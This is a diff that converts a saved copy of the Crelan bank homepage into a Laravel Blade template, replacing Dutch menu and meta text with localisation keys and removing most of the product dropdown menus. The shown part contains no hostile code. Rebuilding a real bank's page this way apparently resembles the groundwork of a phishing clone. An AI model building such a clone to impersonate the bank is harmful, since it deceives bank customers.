@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <!-- saved from url=(0038)https://www.crelan.be/nl/particulieren -->
-<html lang="nl" dir="ltr" prefix="og: https://ogp.me/ns#" class=" js">
+<html lang="{{ app()->getLocale() }}" dir="ltr" prefix="og: https://ogp.me/ns#" class=" js">
 
 <head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -8,7 +8,7 @@
   <meta name="csrf-token" content="{{ csrf_token() }}">
 
   <meta name="description"
-    content="Crelan is een coöperatieve bank waar u als klant voelt dat er een persoonlijk contact is. Op mensenmaat, dat is ons handelsmerk en dat uit zich elke dag in de vertrouwensrelatie die de bank heeft met haar klanten. Crelan hanteert een duurzaam model en toont een echt maatschappelijk engagement.">
+    content="{{ __('messages.meta_description') }}">
   <link rel="stylesheet" href="./assets/css1.css">
   <link rel="stylesheet" href="./assets/css2.css">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -20,7 +20,7 @@
   <link rel="mask-icon" href="./assets/safari-pinned-tab.svg?v=3" color="#84bd00">
   <link rel="shortcut icon" href="./assets/favicon.ico?v=3">
 
-  <title>Welkom op www.crelan.be | Crelan</title>
+  <title>{{ __('messages.welcome_title') }} | Crelan</title>
 
   <link rel="stylesheet" media="all" href="./assets/css_t0f8RY1-isis88e6I24l0pVCbNsARBiVO5y2aaNgqwo.css">
   <link rel="stylesheet" media="all" href="./assets/css_EMp9AfzydcQtCKYpT4yuSDtQNwxYmXNMq4o2F6zOOSk.css">
@@ -57,945 +57,55 @@
                   <li
                     class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                     <a href="#" target="_self"
-                      class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/65">Betalen</a>
+                      class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>
 
-                    <button class="sub-menu-dropdown-trigger js-top-menu-dropdown-trigger" aria-expanded="false">
-                      <span class="visually-hidden">Submenu</span>
-                      <span class="sub-menu-dropdown-trigger__icon" aria-hidden="true"></span>
-                    </button>
-
-                    <div
-                      class="menu-extended-dropdown menu-extended-dropdown--first js-top-menu-target js-top-menu-target-first"
-                      data-target="betalen" data-once="menu-focusout-handler">
-                      <p class="menu-extended-dropdown__title js-top-menu-interactive">Betalen</p>
-                      <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                        <li
-                          class="icon icon-circle-euro menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-circle-euro" aria-hidden="true"></span>
-                            <span class="menu-link__text">Zichtrekeningen</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="betalen-zichtrekeningen">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Zichtrekeningen</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Vergelijk onze packs
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Jongerenrekening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Rekening voor uw kind
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Basisbankdienst
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Zichtrekeningen</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-                        <li
-                          class="icon icon-card menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-card" aria-hidden="true"></span>
-                            <span class="menu-link__text">Kredietkaarten</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="betalen-kredietkaarten">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Kredietkaarten</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Vergelijk onze kredietkaarten
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Visa Gold
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Visa Classic
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Kredietkaarten</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-                        <li class="icon icon-card menu-item menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-card" aria-hidden="true"></span>
-                            <span class="menu-link__text">Debetkaarten</span>
-                          </a>
-                        </li>
-                        <li
-                          class="icon icon-computer menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-computer" aria-hidden="true"></span>
-                            <span class="menu-link__text">Online bankieren</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="betalen-online-bankieren">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Online bankieren</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Homebanking myCrelan
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Crelan Mobile-app
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Veelgestelde vragen
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Digipass gebruiksaanwijzing
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Online bankieren</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-                        <li
-                          class="icon icon-circle-euro menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-circle-euro" aria-hidden="true"></span>
-                            <span class="menu-link__text">Onder nul gaan</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="betalen-onder-nul-gaan">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Onder nul gaan</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Vergelijk onze producten
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Kasfasciliteit
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Comfortkrediet
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Onder nul gaan</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-                        <li
-                          class="icon icon-shield-check menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-shield-check" aria-hidden="true"></span>
-                            <span class="menu-link__text">Veilig bankieren</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="betalen-veilig-bankieren">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Veilig bankieren</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Tips veilig online bankieren
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Eerste hulp bij fraude
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Phishing en online fraude
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Online shoppen
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Veilig gebruik van uw kaarten
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Veilig bankieren</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-
-                        <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                          <a href="#"
-                            class="menu-link menu-link--parent-link">
-                            <span class="menu-link--parent-link__text">Ontdek meer over Betalen</span>
-                            <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                          </a>
-                        </li>
-                      </ul>
-
-                    </div>
                   </li>
                   <li
                     class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                     <a href="#" target="_self"
-                      class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/67">Lenen</a>
+                      class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>
 
-                    <button class="sub-menu-dropdown-trigger js-top-menu-dropdown-trigger" aria-expanded="false">
-                      <span class="visually-hidden">Submenu</span>
-                      <span class="sub-menu-dropdown-trigger__icon" aria-hidden="true"></span>
-                    </button>
-
-                    <div
-                      class="menu-extended-dropdown menu-extended-dropdown--first js-top-menu-target js-top-menu-target-first"
-                      data-target="lenen" data-once="menu-focusout-handler">
-                      <p class="menu-extended-dropdown__title js-top-menu-interactive">Lenen</p>
-                      <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                        <li
-                          class="icon icon-office menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-office" aria-hidden="true"></span>
-                            <span class="menu-link__text">Woning</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="lenen-woning">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Woning</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Hypothecaire lening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Groene lening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Renovatielening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Overbruggingskrediet
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Wederopname hypothecaire lening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Woning</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-                        <li
-                          class="icon icon-car-side menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-car-side" aria-hidden="true"></span>
-                            <span class="menu-link__text">Mobiliteit</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="lenen-mobiliteit">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Mobiliteit</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Autolening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Fietslening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Motorlening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Lening voor mobilhome of caravan
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Lening voor andere voertuigen
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Mobiliteit</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-                        <li
-                          class="icon icon-gift menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-gift" aria-hidden="true"></span>
-                            <span class="menu-link__text">Andere doelen</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="lenen-andere-doelen">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Andere doelen</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Persoonlijke lening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Onder nul gaan op uw zichtrekening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Andere doelen</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-
-                        <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                          <a href="#"
-                            class="menu-link menu-link--parent-link">
-                            <span class="menu-link--parent-link__text">Ontdek meer over Lenen</span>
-                            <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                          </a>
-                        </li>
-                      </ul>
-
-                    </div>
                   </li>
                   <li
                     class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                     <a href="#" target="_self"
-                      class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/66">Sparen en
-                      beleggen</a>
+                      class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/66">{{ __('messages.save_invest') }}</a>
 
-                    <button class="sub-menu-dropdown-trigger js-top-menu-dropdown-trigger" aria-expanded="false">
-                      <span class="visually-hidden">Submenu</span>
-                      <span class="sub-menu-dropdown-trigger__icon" aria-hidden="true"></span>
-                    </button>
-
-                    <div
-                      class="menu-extended-dropdown menu-extended-dropdown--first js-top-menu-target js-top-menu-target-first"
-                      data-target="sparen-en-beleggen" data-once="menu-focusout-handler">
-                      <p class="menu-extended-dropdown__title js-top-menu-interactive">Sparen en beleggen</p>
-                      <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                        <li
-                          class="icon icon-circle-euro menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-circle-euro" aria-hidden="true"></span>
-                            <span class="menu-link__text">Sparen</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="sparen-en-beleggen-sparen">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Sparen</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Spaarrekeningen vergelijken
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Spaartest
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Info gereglementeerde spaarrekeningen
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Termijnrekeningen
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Huurwaarborgrekening
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Sparen</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-                        <li
-                          class="icon icon-chart-simple menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-chart-simple" aria-hidden="true"></span>
-                            <span class="menu-link__text">Beleggen</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="sparen-en-beleggen-beleggen">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Beleggen</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Starten met beleggen
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Beleggingsadvies
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Beleggingsfondsen
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Simuleer uw belegging
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Beluister onze podcasts over beleggen
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Grote vermogens
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Kasbons
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Fondsen zoeken
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Wat na vervaldag?
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Beleggen</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-                        <li
-                          class="icon icon-briefcase menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                          <a href="#"
-                            class="menu-link menu-link--products menu-link--icon">
-                            <span class="menu-link__icon icon-briefcase" aria-hidden="true"></span>
-                            <span class="menu-link__text">Fiscaal sparen</span>
-                          </a>
-                          <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                            data-target="sparen-en-beleggen-fiscaal-sparen">
-                            <p
-                              class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                              Fiscaal sparen</p>
-
-                            <ul data-block="navigation" class="menu menu--products js-top-menu menu--sub-menu">
-
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Pensioensparen
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                <a href="#"
-                                  class="menu-link menu-link--products menu-link--icon">
-                                  <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                  Langetermijnsparen
-                                </a>
-                              </li>
-                              <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                <a href="#"
-                                  class="menu-link menu-link--parent-link">
-                                  <span class="menu-link--parent-link__text">Ontdek meer over Fiscaal sparen</span>
-                                  <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                                </a>
-                              </li>
-
-                            </ul>
-                          </div>
-                        </li>
-
-                        <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                          <a href="#"
-                            class="menu-link menu-link--parent-link">
-                            <span class="menu-link--parent-link__text">Ontdek meer over Sparen en beleggen</span>
-                            <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                          </a>
-                        </li>
-                      </ul>
-
-                    </div>
                   </li>
                   <li
                     class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                     <a href="#" target="_self"
                       class="menu-link menu-link--products"
-                      data-drupal-link-system-path="taxonomy/term/68">Verzekeren</a>
+                      data-drupal-link-system-path="taxonomy/term/68">{{ __('messages.insure') }}</a>
 
-                    <button class="sub-menu-dropdown-trigger js-top-menu-dropdown-trigger" aria-expanded="false">
-                      <span class="visually-hidden">Submenu</span>
-                      <span class="sub-menu-dropdown-trigger__icon" aria-hidden="true"></span>
-                    </button>
-
-                    <div
-                      class="menu-extended-dropdown menu-extended-dropdown--first js-top-menu-target js-top-menu-target-first"
